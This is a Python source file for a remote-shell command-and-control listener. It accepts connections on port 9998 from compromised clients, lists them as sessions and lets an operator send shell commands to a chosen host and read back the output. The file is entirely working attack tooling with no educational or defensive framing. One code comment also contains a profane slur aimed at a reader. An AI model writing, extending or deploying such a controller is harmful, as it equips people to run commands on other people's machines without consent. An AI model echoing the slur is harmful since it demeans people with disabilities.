import socket
import threading

IP = '0.0.0.0'
PORT = 9998
sessions = []

def handle_client(client_socket, address):
    print(f"[+] New session from {address[0]}:{address[1]}")
    while True:
        try:
            # Can't you fucking write the comments in english, RETARD!!!!!!
            # فقط ينتظر الأوامر من السيرفر ولا يرسل شيء من نفسه
            pass
        except:
            break

def command_interface():
    while True:
        print("\n--- Active Sessions ---")
        for i, (sock, addr) in enumerate(sessions):
            print(f"{i+1}) {addr[0]}:{addr[1]}")
        try:
            choice = int(input("Select session number (0 to refresh): "))
            if choice == 0:
                continue
            sock, addr = sessions[choice - 1]
            while True:
                cmd = input(f"[{addr[0]}]$ ")
                if cmd.strip().lower() in ('exit', 'back'):
                    break
                sock.send(cmd.encode())
                result = sock.recv(4096).decode()
                print(result)
        except (ValueError, IndexError):
            print("[!] Invalid session.")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(5)
    print(f'[*] Listening on {IP}:{PORT}')

    threading.Thread(target=command_interface, daemon=True).start()

    while True:
        client, address = server.accept()
        sessions.append((client, address))
        client_handler = threading.Thread(target=handle_client, args=(client, address), daemon=True)
        client_handler.start()

if __name__ == '__main__':
    main()